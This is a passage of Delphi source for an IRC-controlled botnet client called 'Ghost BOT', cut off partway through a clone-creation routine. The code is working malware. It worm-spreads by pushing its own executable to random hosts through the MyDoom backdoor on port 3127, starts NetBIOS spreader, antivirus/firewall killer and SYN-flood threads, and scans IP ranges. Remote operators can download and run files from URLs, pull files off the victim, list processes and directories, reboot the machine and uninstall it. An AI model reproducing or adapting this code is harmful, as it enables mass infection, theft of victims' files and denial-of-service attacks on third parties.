   UNIT uBOT;

   INTERFACE

   USES
     ACLUtils, URLMon, ShellApi, uUtils, Windows, uSockets, Registry, uKeySpy,
     uSynFlood, uStrList;

   {$I Settings.ini}

   TYPE
     TGhostBOT = CLASS(TObject)
     PRIVATE
       ClassA          : BYTE;
       ClassB          : BYTE;
       ClassC          : BYTE;
       ClassD          : BYTE;
       HostName        : STRING;
       WebServerInfo   : STRING;
       ScanPort        : STRING;
       IRCServer       : STRING;
       Channel         : STRING;
       DCCNick         : STRING;
       DCCFileName     : STRING;
       From            : STRING;
       MsgTo           : STRING;
       Remain          : STRING;
       BOTOwner        : STRING;
       IRCNick         : STRING;
       IRCPort         : STRING;
       IdentSock       : TSocket;
       Run_Ident       : Boolean;
       JoinedToChannel : Boolean;
       TopicCommand    : Boolean;
       GoodHost        : Boolean;
       Params          : TStrList;
       SynFlood        : TSynFlood;
       Buffer          : ARRAY[0..1023] OF Char;
       PROCEDURE Restart;
       PROCEDURE StartUp;
       PROCEDURE ReadSock;
       PROCEDURE SendInfo;
       PROCEDURE StopIPScan;
       FUNCTION  GetInfo:STRING;
       FUNCTION  GetNick : STRING;
       PROCEDURE MircCmd(S:STRING);
       PROCEDURE Scan;
       FUNCTION  KillClones : STRING;
       FUNCTION  GetCPUSpeed : Longint;
       PROCEDURE DCCChat;
       PROCEDURE ListDir;
       PROCEDURE DCC_Get;
       PROCEDURE DCC_Send;
       PROCEDURE StartWEB;
       PROCEDURE IdentServ;
       PROCEDURE ListProcess;
       PROCEDURE ListThreads(Sock:TSocket);
       FUNCTION  IncrementIPAddress : STRING;
       PROCEDURE MySend(S:STRING;Sock:TSocket);
       FUNCTION  DownloadFile(S:STRING) : STRING;
       FUNCTION  Listen2(Port:Integer) : TSocket;
       FUNCTION  Port_Redirect : DWORD;
       FUNCTION  ExecuteFile(ProgramName:STRING) : STRING;
       FUNCTION  MyExitWindows(RebootParam:LongWord) : Boolean;
       PROCEDURE Read_Command(MsgFromIRC,MsgFrom:STRING;Sock:TSocket);
       PROCEDURE IPScan(IP,Port:STRING;GhostBOT_:TGhostBOT;Sock:TSocket);
     PUBLIC
       ClonesNum : BYTE;
       DCCGetStr : STRING;
       BOTSock   : TSocket;
       Clone     : Boolean;
       Clones    : ARRAY[1..MaxNumberOfClones] OF TGhostBOT;
       PROCEDURE StartBOT;
       PROCEDURE PrivMsg(S:STRING;Sock:TSocket);
       CONSTRUCTOR Create;
     END;

   VAR
     Thread         : WORD;
     GhostBOT       : TGhostBOT;
     MyDoomPassword : ARRAY[1..5] OF BYTE;

   PROCEDURE MyDoom;
   PROCEDURE WaitForInternet;
   FUNCTION  StartMyDoom : STRING;
   FUNCTION  StartNetBIOS : STRING;
   FUNCTION  StartAVFWKiller : STRING;
   FUNCTION  KillThread(HandleType : WORD) : STRING;
   FUNCTION  Create_Sock(Host:STRING;Port:STRING):TSocket;

   IMPLEMENTATION

   USES
     uWebServer, uKillAV, uNetBIOS, uThreads;

   //------------------------------------------------------------------------------
   PROCEDURE WaitForInternet;
   BEGIN
     WHILE NOT InternetGetConnectedState(NIL,0) DO Sleep(1000);
   END;

   //------------------------------------------------------------------------------
   CONSTRUCTOR TGhostBOT.Create;
   BEGIN
     BOTSock:=0;
     GoodHost:=False;
     JoinedToChannel:=False;
   END;

   //------------------------------------------------------------------------------
   FUNCTION StopNetBIOS : STRING;
   BEGIN
     KillThread(NETBIOSSP_THREAD);
     Result:=MainStr(213);                                                         //"NetBIOS spreader stopped."
   END;

   //------------------------------------------------------------------------------
   FUNCTION StartNetBIOS : STRING;
   VAR
     I : WORD;
   BEGIN
     StopNetBIOS;
     FOR I:=1 TO ThreadNumberOfNetBIOSSpreader DO BEGIN
       Thread:=ThreadList.Add;
       ThreadList.Threads[Thread].TType:=NETBIOSSP_THREAD;
       ThreadList.Threads[Thread].Handle:=CreateThread(NIL,0,@TNetBIOS,NIL,0,ThreadID);
     END;
     Result:=MainStr(214);                                                         //"NetBIOS spreader restarted."
   END;

   //------------------------------------------------------------------------------
   FUNCTION StartAVFWKiller : STRING;
   BEGIN
     Thread:=ThreadList.Add;
     ThreadList.Threads[Thread].TType:=AVFWKILLER_THREAD;
     ThreadList.Threads[Thread].Handle:=CreateThread(NIL,0,@AVKiller,NIL,0,ThreadID);
     Result:=MainStr(209);                                                         //"AV/FW killer restarted."
   END;

   //------------------------------------------------------------------------------
   FUNCTION StopAVFWKiller : STRING;
   BEGIN
     KillThread(AVFWKILLER_THREAD);
     Result:=MainStr(210);                                                         //"AV/FW killer stopped."
   END;

   //------------------------------------------------------------------------------
   FUNCTION StopMyDoom : STRING;
   BEGIN
     KillThread(MYDOOMSP_THREAD);
     Result:=MainStr(207);                                                         //"MyDoom spreader stopped."
   END;

   //------------------------------------------------------------------------------
   FUNCTION StartMyDoom : STRING;
   VAR
     I : WORD;
   BEGIN
     StopMyDoom;
     FOR I:=1 TO ThreadNumberOfMydomSpreader DO BEGIN
       Thread:=ThreadList.Add;
       ThreadList.Threads[Thread].TType:=MYDOOMSP_THREAD;
       ThreadList.Threads[Thread].Handle:=CreateThread(NIL,0,@MyDoom,NIL,0,ThreadID);
     END;
     Result:=MainStr(208);                                                         //"MyDoom spreader restarted."
   END;

   //------------------------------------------------------------------------------
   PROCEDURE MyDoom;
   VAR
     F        : FILE;
     szIPAddr : STRING;
     Sock     : TSocket;
     J        : Integer;
     Buf      : ARRAY [0..1023] OF Char;
     {$IFDEF Use_MyDoom_Nofifier}
     GB       : TGhostBOT;
     {$ENDIF}
   BEGIN
     {$IFDEF Use_MyDoom_Nofifier}
     GB:=ThreadList.Threads[Thread].GhostBOT;
     {$ENDIF}
     WHILE True DO BEGIN
       WaitForInternet;
       szIPAddr:=IntToStr(Random(222)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1);
       Sock:=Create_Sock(szIPAddr,'3127');
       IF Sock<1 THEN Continue;
       MyDoomPassword[3]:=$3c;
       MyDoomPassword[4]:=$9e;
       MyDoomPassword[1]:=$85;
       MyDoomPassword[2]:=$13;
       MyDoomPassword[5]:=$a2;
       Send(Sock,MyDoomPassword[1],5,0);
       AssignFile(F,ParamStr(0));
       FileMode:=0;
       Reset(F,1);
       REPEAT
         BlockRead(F,Buf[0],SizeOf(Buf),J);
         IF J<=0 THEN Break;
         IF Send(Sock,Buf[0],J,0)<=0 THEN Break;
       UNTIL J<>1024;
       {$IFDEF Use_MyDoom_Nofifier}
       ThreadList.Threads[Thread^].GB.PrivMsg(MainStr(222)+szIPAddr,ThreadList.Threads[Thread^].GB.BOTSock);                   //"MyDoom spreader found a victim: "
       {$ENDIF}
       CloseSocket(Sock);
       CloseFile(F);
     END;
   END;

   //------------------------------------------------------------------------------
   FUNCTION KillThread(HandleType : WORD) : STRING;
   VAR
     I : WORD;
     X : Cardinal;
   BEGIN
     FOR I:=1 TO ThreadList.Count DO BEGIN
       IF ThreadList.Threads[I].TType=HandleType THEN BEGIN

         Result:='Error: killthread';
         IF X=0 THEN Exit;
         GetExitCodeThread(ThreadList.Threads[I].Handle,X);
         IF TerminateThread(ThreadList.Threads[I].Handle,X) THEN BEGIN
           Result:=MainStr(23);                                                    //"Operation Completed!
           ThreadList.Threads[I].Handle:=0;
         END;

         IF ThreadList.Threads[I].TType=CLONESS_THREAD THEN BEGIN
           CloseSocket(GhostBOT.Clones[I].BOTSock);
           GhostBOT.Clones[I].Free;
         END;
         ThreadList.Threads[I].TType:=FREE_THREAD;
       END;
     END;
     Result:=MainStr(23);                                                          //"Operation Completed!
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.ListThreads(Sock:TSocket);
   VAR
     I           : BYTE;
     S           : STRING;
     IPScan_     : Boolean;
     Clones_     : Boolean;
     MyDoom_     : Boolean;
     NetBIOS_    : Boolean;
     SynFlooder_ : Boolean;
   BEGIN
     S:='Thread: ';
     SynFlooder_:=False;
     NetBIOS_:=False;
     MyDoom_:=False;
     IPScan_:=False;
     Clones_:=False;
     IF ThreadList.Count>0 THEN BEGIN
       FOR I:=1 TO ThreadList.Count DO BEGIN
         CASE ThreadList.Threads[I].TType OF
           PORTREDIRECT_THREAD : PrivMsg(S+'Port Redirect '+
                                         ThreadList.Threads[I].Params1+' '+
                                         ThreadList.Threads[I].Params2+' '+
                                         ThreadList.Threads[I].Params3,Sock);
           WEBSERVER_THREAD    : PrivMsg(S+MainStr(227)+WebServerInfo,Sock);           //"Web server "
           AVFWKILLER_THREAD   : PrivMsg(S+MainStr(225),Sock);                         //"AV/FW killer"
           SYNFLOODER_THREAD   : BEGIN
                            IF NOT SynFlooder_ THEN PrivMsg(S+MainStr(226),Sock);//"Syn flooder"
                            SynFlooder_:=True;
                          END;
           MYDOOMSP_THREAD     : BEGIN
                            IF NOT MyDoom_ THEN PrivMsg(S+MainStr(223)+IntToStr(ThreadNumberOfMydomSpreader)+MainStr(229),Sock); //"MyDoom spreader ("," threads"
                            MyDoom_:=True;
                          END;
           NETBIOSSP_THREAD    : BEGIN
                            IF NOT NetBIOS_ THEN PrivMsg(S+MainStr(223)+IntToStr(ThreadNumberOfNetBIOSSpreader)+MainStr(229),Sock); //"NetBIOS spreader ("," threads"
                            NetBIOS_:=True;
                          END;
           IPSCANN_THREAD      : BEGIN
                            IF NOT IPScan_ THEN PrivMsg(S+MainStr(228)+IntToStr(ThreadNumberOfIPScanner)+MainStr(229),Sock); //"IP scanner ("," threads"
                            IPScan_:=True;
                          END;
           CLONESS_THREAD      : BEGIN
                            IF NOT Clones_ THEN PrivMsg(S+'Clones ('+IntToStr(ClonesNum)+MainStr(229),Sock);
                            Clones_:=True;
                          END;
         END;
       END;
     END;
   END;

   //------------------------------------------------------------------------------
   FUNCTION TGhostBOT.KillClones : STRING;
   BEGIN
      ClonesNum:=0;
      KillThread(CLONESS_THREAD);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.ListProcess;
   VAR
     ContinueLoop    : BOOL;
     FSnapshotHandle : THandle;
     Sock            : TSocket;
     FProcessEntry32 : TProcessEntry32;
   BEGIN
     Self:=ThreadList.Threads[Thread].GhostBOT;
     Sock:=ThreadList.Threads[Thread].Sock;
     FSnapshotHandle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
     FProcessEntry32.dwSize:=SizeOf(FProcessEntry32);
     ContinueLoop:=Process32First(FSnapshotHandle,FProcessEntry32);
     WHILE ContinueLoop DO BEGIN
       Self.PrivMsg(FProcessEntry32.szExeFile,Sock);
       ContinueLoop:=Process32Next(FSnapshotHandle,FProcessEntry32);
     END;
     CloseHandle(FSnapshotHandle);
     KillThread(LISTPROCESS_THREAD);
   END;

   //------------------------------------------------------------------------------
   FUNCTION TGhostBOT.GetCPUSpeed : Longint;
   VAR
     TimerHi : DWORD;
     TimerLo : DWORD;
   BEGIN
     SetPriorityClass(GetCurrentProcess,REALTIME_PRIORITY_CLASS);
     SetThreadPriority(GetCurrentThread,THREAD_PRIORITY_TIME_CRITICAL);
     Sleep(10);
     ASM
       dw 310Fh // rdtsc
       mov TimerLo,eax
       mov TimerHi,edx
     END;
     Sleep(500);
     ASM
       dw 310Fh // rdtsc
       sub eax,TimerLo
       sbb edx,TimerHi
       mov TimerLo,eax
       mov TimerHi,edx
     END;
     SetThreadPriority(GetCurrentThread,GetThreadPriority(GetCurrentThread));
     SetPriorityClass(GetCurrentProcess,GetPriorityClass(GetCurrentProcess));
     Result:=TimerLo DIV 500000;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.MySend(S:STRING;Sock:TSocket);
   BEGIN
     S:=S+CRLF;
     Send(Sock,S[1],Length(S),0);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.PrivMsg(S:STRING;Sock:TSocket);
   BEGIN
     IF (Sock>0)AND(Sock<>BOTSock) THEN MySend(S,Sock) ELSE BEGIN
       S:=MainStr(48)+MsgTo+' :'+S+CRLF;                                           //"PRIVMSG "
       Send(Sock,S[1],Length(S),0);
       Sleep(FloodDelay);
     END;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.DCC_Send;
   VAR
     PortNum    : WORD;
     C          : WORD;
     TestFile   : FILE;
     Mode       : DWORD;
     FD_Struct  : TFDSet;
     Result     : STRING;
     Files      : STRING;
     Err2       : Integer;
     Length_    : Integer;
     AddrLen    : Integer;
     FSend      : Integer;
     Bytes_Sent : Integer;
     DCC        : TSocket;
     Sock       : TSocket;
     Sock2      : TSocket;
     Time       : TTimeVal;
     GuestAddr  : TSockAddrIn;
     SockAddr   : TSockAddrIn;
     Buffer     : ARRAY[0..1023] OF Char;
   BEGIN
     Self:=ThreadList.Threads[Thread].GhostBOT;
     Sock2:=ThreadList.Threads[Thread].Sock;
     IF FileExists(DCCFileName) THEN BEGIN
       Mode:=0;
       WHILE True DO BEGIN
         DCC:=Socket(AF_INET,SOCK_STREAM,0);
         IF DCC=INVALID_SOCKET THEN BEGIN
           Result:=MainStr(67);                                                    //"DCC error!"
           Break;
         END;
         FillChar(SockAddr,SizeOf(SockAddr),0);
         SockAddr.sin_family:=AF_INET;
         SockAddr.sin_port:=htons(0);
         SockAddr.sin_addr.s_addr:=INADDR_ANY;
         IF Bind(DCC,SockAddr,SizeOf(SockAddr))<>0 THEN BEGIN
           Result:=MainStr(67);                                                    //"DCC error!"
           Break;
         END;
         Length_:=SizeOf(SockAddr);
         GetSockName(DCC,SockAddr,Length_);
         PortNum:=ntohs(SockAddr.sin_port);
         Files:=DCCFileName;
         FOR c:=1 to Length(DCCFileName) DO BEGIN
           IF DCCFileName[C]=Chr(32) THEN Files[C]:=Chr(95) ELSE Files[C]:=DCCFileName[C];
         END;
         IF Listen(DCC,1)<>0 THEN BEGIN
           Result:=MainStr(67);                                                    //"DCC error!"
           Break;
         END;
         AssignFile(TestFile,DCCFileName);
         FileMode:=0;
         Reset(TestFile,1);
         Length_:=FileSize(TestFile);
         MySend(MainStr(48)+DCCNick+' :'+'DCC SEND '+Files+' '+IntToStr(htonl(inet_addr(pChar(NameToIP('')))))+' '+IntToStr(PortNum)+' '+IntToStr(Length_)+'',BOTSock); //"PRIVMSG "
         Time.tv_sec:=60;
         Time.tv_usec:=0;
         FD_ZERO(FD_Struct);
         FD_SET(DCC,FD_Struct);
         IF Select(0,@FD_Struct,NIL,NIL,@Time)<=0 THEN BEGIN
           Result:=MainStr(68);                                                    //"DCC send timeout!"
           Break;
         END;
         AddrLen:=SizeOf(GuestAddr);
         Sock:=Accept(DCC,@GuestAddr,@addrlen);
         IF Sock=INVALID_SOCKET THEN BEGIN
           Result:=MainStr(67);                                                    //"DCC error!"
           Break;
         END;
         CloseSocket(DCC);
         WHILE Length_>0 DO BEGIN
           FSend:=1024;
           FillChar(Buffer,SizeOf(Buffer),0);
           IF FSend>Length_ THEN FSend:=Length_;
           BlockRead(TestFile,Buffer,FSend,Mode);
           Bytes_Sent:=Send(Sock,Buffer,FSend,0);
           Err2:=Recv(Sock,Buffer,SizeOf(Buffer),0);
           IF(Err2<1)OR(Bytes_Sent<1) THEN BEGIN
             CloseSocket(Sock);
             PrivMsg(MainStr(69),Sock2);                                           //"Socket error!"
             Exit;
           END;
           Length_:=Length_-Bytes_Sent;
         END;
         CloseFile(TestFile);
         Result:=MainStr(70);                                                      //"Transfer complete!"
         Break;
       END;
       IF DCC>0 THEN CloseSocket(DCC);
       CloseSocket(Sock);
     END ELSE Result:=MainStr(66);                                                 //"File is not exists!"
     PrivMsg(Result,Sock2);
     KillThread(DCCSEND_THREAD);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.DCC_Get;
   VAR
     F           : FILE;
     Host        : STRING;
     Port        : STRING;
     FileName    : STRING;
     Err         : Integer;
     Sock        : TSocket;
     Received    : Integer;
     received2   : Longint;
     Sock2       : TSocket;
     Paramss     : TStrList;
     Buffer      : ARRAY[0..4095] OF Char;
   BEGIN
     Self:=ThreadList.Threads[Thread].GhostBOT;
     Sock2:=ThreadList.Threads[Thread].Sock;
     Paramss:=TStrList.Create;
     SplitParams(DCCGetStr,Paramss);
     FileName:=Paramss.Strings(0);
     Port:=Paramss.Strings(2);
     IF StrToInt(Port)=0 THEN BEGIN
       Paramss.Free;
       Exit;
     END;
     Host:=Paramss.Strings(1);
     Received:=0;
     FileName:=WinPath+FileName;
     WHILE True DO BEGIN
       {$I-}
       AssignFile(F,FileName);
       Rewrite(F,1);
       Sock:=Create_Sock(Host,Port);
       IF Sock<0 THEN BEGIN
         PrivMsg(MainStr(71),Sock2);                                               //"Error connecting!"
         Break;
       END;
       Err:=1;
       WHILE Err<>0 DO BEGIN
         FillChar(Buffer,SizeOf(Buffer),0);
         Err:=recv(Sock,Buffer,SizeOf(Buffer),0);
         IF Err=0 THEN Break;
         IF Err=SOCKET_ERROR THEN BEGIN
           CloseFile(F);
           CloseSocket(Sock);
           Exit;
         END;
         BlockWrite(F,Buffer[0],Err);
         Received:=Received+Err;
         Received2:=htonl(Received);
         Send(Sock,Received2,4,0);
       END;
       PrivMsg(MainStr(72)+IntToStr(Received)+MainStr(73),Sock2);                  //"Transfer completed (size: "," bytes)"
       Break;
     END;
     CloseFile(F);
     {$I+}
     CloseSocket(Sock);
     Paramss.Free;
     KillThread(DCCGET_THREAD);
   END;
   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.ListDir;
   VAR
     Sock      : TSocket;
     Error     : Integer;
     SearchRec : TSearchRec;
   BEGIN
     Self:=ThreadList.Threads[Thread].GhostBOT;
     Sock:=ThreadList.Threads[Thread].Sock;
     Error:=FindFirst(ThreadList.Threads[Thread].Params1,faAnyFile OR faHidden,SearchRec);
     WHILE Error=0 DO BEGIN
       Error:=FindNext(SearchRec);
       PrivMsg(SearchRec.Name,Sock);
     END;
     KillThread(LISTDIR_THREAD);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE Update(SourceFile:STRING);
   VAR
     T         : STRING;
     TempDir   : STRING;
     S         : ARRAY[0..255] OF Char;
   BEGIN
     GetTempPath(Length(S),@S);
     TempDir:=S;
     T:=RandomFileName;
     UrlDownloadToFile(NIL,pChar(SourceFile),pChar(TempDir+T),0,NIL);
     FillChar(sInfo,SizeOf(STARTUPINFO),0);
     WSACleanup();
     WinExec(pChar(TempDir+T+' '+ParamStr(0)),SW_SHOW);
     ExitProcess(0);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE Uninstall;
   VAR
     F         : FILE;
     BATFile   : STRING;
     T         : STRING;
     S         : ARRAY[0..255] OF Char;
   BEGIN
     GetTempPath(Length(S),@S);
     BATFile:=S+MainStr(74);                                                       //"rs.bat"
     AssignFile(F,BATFile);
     Rewrite(F,1);
     T:=MainStr(75)+CRLF+                                                          //"@echo off"
        MainStr(76)+CRLF+                                                          //":start"
        MainStr(220)+' '+ParamStr(0)+CRLF+                                         //"attrib -h"
        MainStr(77)+ParamStr(0)+' '+MainStr(89)+CRLF+                              //"if not exist ","goto done"
        MainStr(78)+ParamStr(0)+CRLF+                                              //"del /F "
        MainStr(87)+ParamStr(0)+CRLF+                                              //"del "
        MainStr(203)+CRLF+                                                         //"goto start"
        MainStr(88)+CRLF+                                                          //:done
        MainStr(78)+BATFile+CRLF+                                                  //"del /F ","rs.bat"
        MainStr(87)+BATFile;                                                       //"del "
     BlockWrite(F,T[1],Length(T));
     CloseFile(F);
     WinExec(pChar(BATFile),SW_HIDE);
     WSACleanup;
     ExitProcess(0);
   END;

   //------------------------------------------------------------------------------
   FUNCTION TGhostBOT.GetNick : STRING;
   VAR
     I : BYTE;
     P : STRING;
     Q : STRING;
     T : Cardinal;
     S : ARRAY[0..249] OF Char;
   BEGIN
     P:='';
     FillChar(S,SizeOf(S),0);
     T:=SizeOf(S);
     GetUserName(@S,T);
     Q:=S;
     I:=Pos(' ',S);
     IF I>0 THEN SetLength(Q,I);
     T:=Length(Q);
     IF(T<3)OR(T>20)OR(UpperCase(Q)=MainStr(91)) THEN                              //"ADMINISTRATOR"
       FOR I:=1 TO 6 DO P:=P+MainStr(3)[Random(26)+1] ELSE BEGIN
         FOR I:=1 TO T DO P:=P+Q[I];
         P:=P+IntToStr(Random(99)+1);
       END;
     Result:=P;
   END;

   //------------------------------------------------------------------------------
   FUNCTION TGhostBOT.IncrementIPAddress : STRING;
   BEGIN
     IF ClassD<=254 THEN Inc(ClassD) ELSE BEGIN
       ClassD:=0;
       Inc(ClassC);
       IF ClassC<=254 THEN Exit;
       ClassC:=0;
       Inc(ClassB);
       IF ClassB<=254 THEN Exit;
       ClassB:=0;
       Inc(ClassA);
       IF ClassA<=254 THEN Exit;
       ClassA:=0;
     END;
     Result:=IntToStr(ClassA)+'.'+IntToStr(ClassB)+'.'+IntToStr(ClassC)+'.'+IntToStr(ClassD);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.Scan;
   VAR
     S        : STRING;
     Sock     : TSocket;
     Sock2    : TSocket;
   BEGIN
     Self:=ThreadList.Threads[Thread].GhostBOT;
     Sock2:=ThreadList.Threads[Thread].Sock;
     WHILE True DO BEGIN
       S:=IncrementIPAddress;
       Sock:=Create_Sock(S,ScanPort);
       IF Sock>0 THEN PrivMsg(MainStr(96)+S+MainStr(97)+ScanPort,Sock2); //"Found: "," Port: "
     END;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.IPScan(IP,Port:STRING;GhostBOT_:TGhostBOT;Sock:TSocket);
   VAR
     J : BYTE;
     I : WORD;
   BEGIN
     IF Port='' THEN Exit;
     ScanPort:=Port;
     J:=Pos('.',IP);
     ClassA:= StrToInt(Copy(IP,1,J-1));
     Delete(IP,1,J);
     J:=Pos('.',IP);
     ClassB:= StrToInt(Copy(IP,1,J-1));
     Delete(IP,1,J);
     J:=Pos('.',IP);
     ClassC:= StrToInt(Copy(IP,1,J-1));
     Delete(IP,1,J);
     ClassD:=StrToInt(IP);
     KillThread(IPSCANN_THREAD);
     FOR I:=1 TO ThreadNumberOfIPScanner DO BEGIN
       Thread:=ThreadList.Add;
       ThreadList.Threads[Thread].GhostBOT:=GhostBOT_;
       ThreadList.Threads[Thread].Sock:=Sock;
       ThreadList.Threads[Thread].TType:=IPSCANN_THREAD;
       ThreadList.Threads[Thread].Handle:=CreateThread(NIL,0,@TGhostBOT.Scan,NIL,0,ThreadID);
     END;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.StopIPScan;
   BEGIN
     KillThread(IPSCANN_THREAD);
   END;

   //------------------------------------------------------------------------------
   FUNCTION TGhostBOT.DownloadFile(S:STRING) : STRING;
   VAR
     I          : Boolean;
   BEGIN
     TRY
       IF UrlDownloadToFile(NIL,pChar(Params.Strings(1)),pChar(Params.Strings(2)),0,NIL)=S_OK THEN I:=True ELSE I:=False;
     EXCEPT
       I:=False;
     END;
     IF I THEN Result:=MainStr(100) ELSE Result:=MainStr(101);                     //"Download complete!","Download error!"
   END;

   //------------------------------------------------------------------------------
   FUNCTION TGhostBOT.MyExitWindows(RebootParam:LongWord) : Boolean;
   VAR
     cbtpPrevious          : DWORD;
     pcbtpPreviousRequired : DWORD;
     tpResult              : Boolean;
     TTokenHd              : THandle;
     TTokenPvg             : TTokenPrivileges;
     rTTokenPvg            : TTokenPrivileges;
   BEGIN
     IF Win32Platform=VER_PLATFORM_WIN32_NT THEN BEGIN
       tpResult:=OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES OR TOKEN_QUERY,TTokenHd);
       IF tpResult THEN BEGIN
         tpResult:=LookupPrivilegeValue(NIL,pChar(MainStr(102)),TTokenPvg.Privileges[0].Luid); //"SeShutdownPrivilege"
         TTokenPvg.PrivilegeCount:=1;
         TTokenPvg.Privileges[0].Attributes:=SE_PRIVILEGE_ENABLED;
         cbtpPrevious:=SizeOf(rTTokenPvg);
         pcbtpPreviousRequired:=0;
         IF tpResult THEN Windows.AdjustTokenPrivileges(TTokenHd,False,TTokenPvg,cbtpPrevious,rTTokenPvg,pcbtpPreviousRequired);
       END;
     END;
     Result:=ExitWindowsEx(RebootParam,0);
   END;

   //------------------------------------------------------------------------------
   FUNCTION TGhostBOT.ExecuteFile(ProgramName:STRING) : STRING;
   VAR
     StartInfo : TStartupInfo;
     ProcInfo  : TProcessInformation;
   BEGIN
     FillChar(StartInfo,SizeOf(TStartupInfo),0);
     FillChar(ProcInfo,SizeOf(TProcessInformation),0);
     StartInfo.cb:=SizeOf(TStartupInfo);
     IF CreateProcess(PChar(ProgramName),NIL,NIL,NIL,False,
          CREATE_NEW_PROCESS_GROUP+NORMAL_PRIORITY_CLASS,
          NIL,NIL,StartInfo,ProcInfo) THEN Result:=MainStr(103) ELSE Result:=MainStr(104);//"Execute complete!","Execute error!"
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.StartWEB;
   BEGIN
     WHILE TRUE DO BEGIN
       IF InternetGetConnectedState(NIL,0) THEN BEGIN
         IF WebServerWorking=False THEN BEGIN
           StartWebServer;
           WebServerWorking:=True;
         END;
       END ELSE WebServerWorking:=False;
       Sleep(10000);
     END;
   END;

   //------------------------------------------------------------------------------
   FUNCTION TGhostBOT.GetInfo:STRING;
   VAR
     Total         : Longint;
     MemoryStatus  : TMemoryStatus;
     OSVersionInfo : TOSVersionInfo;
     HostName      : ARRAY[0..069] OF Char;
     Date          : ARRAY[0..069] OF Char;
     Time          : ARRAY[0..069] OF Char;
     OS            : ARRAY[0..070] OF Char;
     SysDir        : ARRAY[0..255] OF Char;
   BEGIN
     GetHostName(HostName,SizeOf(HostName));
     Total:=GetTickCount DIV 1000;
     OSVersionInfo.dwOSVersionInfoSize:=SizeOf(TOSVersionInfo);
     GetVersionEx(OSVersionInfo);
     MemoryStatus.dwLength:=SizeOf(TMemoryStatus);
     GlobalMemoryStatus(MemoryStatus);
     GetDateFormat($409,0,NIL,'dd:MMM:yyyy',Date,70);
     GetTimeFormat($409,0,NIL,'HH:mm:ss',Time,70);
     GetSystemDirectory(SysDir,SizeOf(SysDir));
     IF (OSVersionInfo.dwMajorVersion=4)AND(OSVersionInfo.dwMinorVersion=0) THEN BEGIN
       IF (OSVersionInfo.dwPlatformId = VER_PLATFORM_WIN32_WINDOWS) THEN StrCopy(OS,'95');
       IF (OSVersionInfo.dwPlatformId = VER_PLATFORM_WIN32_NT) THEN StrCopy(OS,'NT');
     END
     ELSE IF (OSVersionInfo.dwMajorVersion=4)AND(OSVersionInfo.dwMinorVersion=10) THEN StrCopy(OS,'98')
     ELSE IF (OSVersionInfo.dwMajorVersion=4)AND(OSVersionInfo.dwMinorVersion=90) THEN StrCopy(OS,'ME')
     ELSE IF (OSVersionInfo.dwMajorVersion=5)AND(OSVersionInfo.dwMinorVersion=0) THEN StrCopy(OS,'2000')
     ELSE IF (OSVersionInfo.dwMajorVersion=5)AND(OSVersionInfo.dwMinorVersion=1) THEN StrCopy(OS,'XP')
     ELSE StrCopy(OS,'???');

     Result:=MainStr(231)+IntToStr(GetCPUSpeed)+MainStr(230)+                      //"CPU: "," MHz, RAM: "
     IntToStr(MemoryStatus.dwTotalPhys DIV 1048576)+MainStr(232)+                  //"MB total, "
     IntToStr(MemoryStatus.dwAvailPhys DIV 1048576)+MainStr(233)+                  //"MB free, "
     IntToStr(MemoryStatus.dwMemoryLoad)+MainStr(234)+                             //"% in use, OS: "
     IntToStr(OSVersionInfo.dwMajorVersion)+'.'+IntToStr(OSVersionInfo.dwMinorVersion)+
     MainStr(243)+IntToStr(OSVersionInfo.dwBuildNumber)+MainStr(235)+              //", build ","). uptime: "
     IntToStr(Total DIV 86400)+'d '+IntToStr((Total MOD 86400) DIV 3600)+'h '+
     IntToStr(((Total MOD 86400) MOD 3600) DIV 60)+MainStr(242)+                   //"m Date: "
     Date+MainStr(244)+Time+MainStr(245)+NameToIP('')+MainStr(241)+HostName+       //" Time: "," IP: "," HostName: "
     MainStr(239)+WinPath+MainStr(240)+SysDir;                                     //" WinPath: "," SystemDir: "
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.SendInfo;
   BEGIN
     MySend(MainStr(236)+IRCNick,BOTSock);                                         //"NICK "
     MySend(MainStr(237)+IRCNick+MainStr(238),BOTSock);                            //"USER "," Ghost BOT :Ghost-BOT"
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.StartUp;
   VAR
     I : WORD;
     S : STRING;
   BEGIN
     IF NOT Clone THEN BEGIN
       S:=Decodestring(Random(ItemsCountInEncodedString(TIRCSERVERS))+1,TIRCSERVERS);
       I:=Pos(':',S);
       IRCServer:=Copy(S,1,I-1);
       Delete(S,1,I);
       IRCPort:=S;
       Channel:=BOTStr(2);
     END;
     IRCNick:=GetNick;
     {$IFDEF USE_IDENT_SERVER}
     Run_Ident:=True;
     WITH ThreadList DO BEGIN
       Thread:=Add;
       Threads[Thread].TType:=IDENTSERVER_THREAD;
       Threads[Thread].GhostBOT:=GhostBOT;
       Threads[Thread].Handle:=CreateThread(NIL,0,@TGhostBOT.IdentServ,NIL,0,ThreadID);
     END;
     {$ENDIF}
     BOTSock:=Create_Sock(IRCServer,IRCPort);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.Restart;
   BEGIN
     Shutdown(BOTSock,2);
     CloseSocket(BOTSock);
     Sleep(WaitBeforeReconnect);
     StartUp;
     SendInfo;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE CreateClones;
   BEGIN
     WITH ThreadList.Threads[Thread].GhostBOT DO BEGIN
       Inc(ClonesNum);
       Clones[ClonesNum]:=TGhostBOT.Create;
       Clones[ClonesNum].Clone:=True;
       Clones[ClonesNum].IRCServer:=Params.Strings(1);
       Clones[ClonesNum].IRCPort:=Params.Strings(2);
